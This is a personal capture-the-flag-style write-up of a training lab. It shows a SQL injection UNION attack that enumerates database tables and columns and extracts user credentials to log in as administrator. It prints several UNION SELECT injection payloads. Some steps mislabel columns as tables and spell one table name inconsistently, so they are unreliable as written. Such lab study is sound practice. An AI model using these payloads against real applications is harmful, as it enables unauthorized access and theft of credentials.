
![](../../attachments/Pasted%20image%2020240528154701.png)

From the lab description This lab contains SQL injection Vulnerability in Product category filter 
to solve this lab we need to login as administrator 
this lab contains non oracle databases

refer to [SQL CHEAT SHEET](../SQL%20CHEAT%20SHEET.md) for payloads
Let's access the lab 
like as usual we've intercepted the request and sent it to repeater now let's check number of columns and determine the data type of those columns to perform a union attack 

![](../../attachments/Pasted%20image%2020240528155320.png)

we got internal server error of we dfo order by 3 so number of columns is 2 now let's determine the datatype of those columns The payload is 
`'+UNION+SELECT+'abc','def'-- `
![](../../attachments/Pasted%20image%2020240528155700.png)

so we now know that both columns are of same data type let's now retrieve the username and password for the file 

![](../../attachments/Pasted%20image%2020240528155829.png)


payload to retrieve information about list of tables in database

`+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`

We got some list of tables let's check them
![](../../attachments/Pasted%20image%2020240528160753.png)


![](../../attachments/Pasted%20image%2020240528161215.png)

the above is the user table 



to retrieve the usernames the payload will be 
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_avyrcv'--

![](../../attachments/Pasted%20image%2020240528161452.png)

we got a username table and a match with word starting with pass that might be the password table 


username_umpehj


The payload to view password table will be 

'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='password_ohgyxof'--



we got our password table too
let's retrieve the details form both tables 

The paylaod will be 


username table : users_avyrcv
password table : password_ohgyxo
username: username_umpehj

'+UNION+SELECT+username_umpehj,+ password_ohgyxo+FROM+users_avyrcv--

'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_avyrcv'--

![](../../attachments/Pasted%20image%2020240528164107.png)

let's find administrator details and login 

![](../../attachments/Pasted%20image%2020240528164241.png)

now let's login

![](../../attachments/Pasted%20image%2020240528164353.png)


